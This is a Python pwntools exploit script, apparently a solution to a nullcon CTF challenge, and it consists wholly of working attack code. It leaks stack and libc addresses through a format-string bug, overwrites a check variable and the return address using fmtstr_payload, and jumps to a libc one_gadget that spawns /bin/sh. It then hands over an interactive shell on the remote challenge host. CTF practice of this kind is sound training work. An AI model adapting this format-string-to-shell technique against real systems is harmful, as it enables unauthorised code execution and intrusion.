from pwn import *

context.arch='amd64'

"""
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

"""

checker_delta = 0x20105c
one_gadget_delta = 0x45216

if args.REMOTE:
	p = remote('pwn2.ctf.nullcon.net', 5003)
else:
	p = process('./challenge')

	gdb.attach(p, '''
		brva 0x905
		continue
		''')

libc = ELF('./libc-2.23.so')
input_number = 0x10000 - 0x60 - 30

# First execution

p.sendline(str(input_number))

p.send(b'%p.%9$p.%13$p.' + b'B' * 10 + b'\x16')

ret_addr = int(p.recvuntil(b'.')[:-1], 16) + 0x18
start_main_addr = int(p.recvuntil(b'.')[:-1].decode(), 16) - 214
libc.address = start_main_addr - libc.symbols.__libc_start_main
binary_addr =  int(p.recvuntil(b'.')[:-1].decode(), 16) & 0xfffffffffffff000
checker_addr = binary_addr + checker_delta
one_gadget_addr = libc.address + one_gadget_delta

log.success('ret @ 0x%x' % (ret_addr, ))

log.success('binary @ 0x%x' % (binary_addr, ))
log.info('checker @ 0x%x' % (checker_addr, ))

log.success('__libc_start_main @ 0x%x' % (start_main_addr, ))
log.info('libc @ 0x%x' % (libc.address, ))
log.info('one_gadget @ 0x%x' % (one_gadget_addr, ))

# Second execution

#p.sendline(str(input_number))

writes = {
	checker_addr: 0,
	ret_addr: one_gadget_addr
	}
	
payload = fmtstr_payload(6, writes)

#print(len(payload))
#print(payload)

p.send(payload)

p.recv(1024)
p.recv(1024)

p.interactive()
